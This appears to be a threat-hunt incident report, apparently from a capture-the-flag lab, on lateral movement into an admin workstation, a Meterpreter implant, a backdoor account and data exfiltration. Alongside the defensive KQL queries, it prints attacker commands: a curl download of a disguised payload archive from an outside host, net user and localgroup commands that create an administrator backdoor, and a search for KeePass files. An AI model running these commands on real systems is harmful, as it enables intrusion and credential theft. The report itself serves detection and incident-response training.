# Threat-Hunt-Bridge-Takeover

Executive Summary
Incident ID: INC2025-0011-020
Incident Severity: Severity 1 (Critical)
Incident Status: Resolved

Incident Overview
Following a confirmed compromise of the account yuki.tanaka during the initial intrusion (CTF 1 – Port of Entry), the unauthorized entity leveraged the same credentials to perform lateral movement from the previously compromised system (10.1.0.204) to the administrative workstation azuki-adminpc. The attacker conducted extensive reconnaissance, deployed a Metasploit-based C2 implant, established persistence through a backdoor account, performed credential harvesting across multiple data sources, and exfiltrated sensitive financial and credential data to the cloud file-sharing service gofile.io.

Key Findings
The compromised account yuki.tanaka was reused for lateral movement via Remote Desktop Protocol (RDP) from IP 10.1.0.204 to azuki-adminpc. Once on the administrative workstation, the attacker downloaded a password-protected 7-Zip archive disguised as a Windows security update (KB5044273-x64.7z) from the file hosting service litter.catbox.moe using curl.exe. Extraction of this archive revealed a Metasploit Meterpreter implant (meterpreter.exe) along with additional offensive tools including m.exe (a Mimikatz variant) and silentlynx.exe.
The C2 implant established a named pipe (\Device\NamedPipe\msf-pipe-5902) for inter-process communication. Obfuscated PowerShell commands were executed to create a backdoor account (yuki.tanaka2) and escalate it to the local Administrators group. The attacker performed extensive discovery actions including RDP session enumeration (qwinsta.exe), domain trust enumeration (nltest.exe), network connection mapping (NETSTAT.EXE -ano), and targeted searches for password databases (.kdbx files) and credential files (OLD-Passwords.lnk).
Data was staged in a hidden directory (C:\ProgramData\Microsoft\Crypto\staging) mimicking legitimate Windows paths. Robocopy.exe was used to systematically collect financial documents including banking records, QuickBooks data, tax records, and contracts. A total of 8 archives were created for exfiltration. Browser credential theft was conducted using Mimikatz (m.exe) to extract saved Chrome login data. All stolen data was exfiltrated via curl.exe HTTP POST requests to store1.gofile.io (IP: 45.112.123.227). The master password for a KeePass database was also extracted and saved to KeePass-Master-Password.txt.

Immediate Actions
The SOC and DFIR teams initiated incident response procedures upon detection. The compromised workstation azuki-adminpc was immediately isolated via VLAN segmentation. The accounts yuki.tanaka and yuki.tanaka2 (backdoor) were disabled in Active Directory. Firewall rules were updated to block all communications with gofile.io, litter.catbox.moe, and the exfiltration server IP 45.112.123.227. All event logs were preserved and collected by the existing SIEM for forensic analysis.

Technical Analysis
Affected Systems & Data
Devices
azuki-adminpc – Administrative/executive workstation (primary target)

Accounts
yuki.tanaka – Compromised account used for lateral movement and all attacker activity
yuki.tanaka2 – Backdoor account created by attacker for persistence

Evidence Sources & Analysis
Lateral Movement 
Querying DeviceLogonEvents for RemoteInteractive sessions on Azuki devices revealed the compromised account yuki.tanaka authenticating to azuki-adminpc from source IP 10.1.0.204. This IP corresponds to the system compromised during the initial breach (CTF 1). Multiple successful RDP logon events were observed spanning November 24–25, 2025, confirming sustained lateral movement.
DeviceLogonEvents | where DeviceName contains "azuki" | where ActionType == "LogonSuccess" | where LogonType == "RemoteInteractive" | project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP | order by TimeGenerated desc

Malware Delivery 
Analysis of DeviceNetworkEvents on azuki-adminpc filtered for curl.exe connections with successful outbound connections revealed two external file-hosting services contacted by the attacker. The first connection at 2025-11-25T04:21:12.0783558Z reached litter.catbox.moe (IP: 108.181.20.36) to download the malicious archive. The full download command was:
"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
The archive was disguised as a Windows cumulative security update (KB5044273) to avoid suspicion. Subsequent process execution logs showed the archive was extracted using 7-Zip with a password parameter:
"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y

C2 Implant & Named Pipe
Querying DeviceFileEvents for executable and script file creations in the extraction timeframe on azuki-adminpc revealed three malicious files extracted from the archive at 2025-11-25T04:21:33Z: meterpreter.exe (the primary C2 beacon), silentlynx.exe, and m.exe (Mimikatz credential theft tool).
Analysis of DeviceEvents for NamedPipeEvent actions on azuki-adminpc, with JSON parsing of the AdditionalFields to extract PipeName, identified two Metasploit framework named pipes created by the meterpreter.exe process:
\Device\NamedPipe\msf-pipe-5902  (created at 04:24:35)
\Device\NamedPipe\msf-pipe-5722  (created at 05:36:54)
The "msf-pipe" naming pattern is a well-known Metasploit Framework indicator of compromise and confirms active C2 communication channels.

Obfuscated Commands – Account Creation & Privilege Escalation
DeviceProcessEvents queries filtered for PowerShell executions with -EncodedCommand parameters on azuki-adminpc under the yuki.tanaka account revealed two Base64-encoded commands. Decoding these commands exposed:
Account creation command:
net user yuki.tanaka2 B@ckd00r2024! /add
Privilege escalation command:
net localgroup Administrators yuki.tanaka2 /add
The backdoor account yuki.tanaka2 was crafted to closely resemble the legitimate yuki.tanaka account, making it difficult to detect through casual inspection. The account was immediately elevated to the local Administrators group, granting full system privileges.

Report Tables — Ready to paste into your README

Discovery & Reconnaissance
TimestampTechniqueCommandPurpose04:08:58T1033qwinsta.exeEnumerate active RDP sessions to identify logged-in users04:09:25T1482"nltest.exe" /domain_trusts /all_trustsEnumerate domain trust relationships for lateral movement paths04:10:07T1049"NETSTAT.EXE" -anoMap active network connections and listening services04:13:45T1552.001cmd.exe /c where /r C:\Users *.kdbxSearch for KeePass password database files04:15:57T1552.001OLD-Passwords.lnk discoveredPlaintext password file found on user Desktop

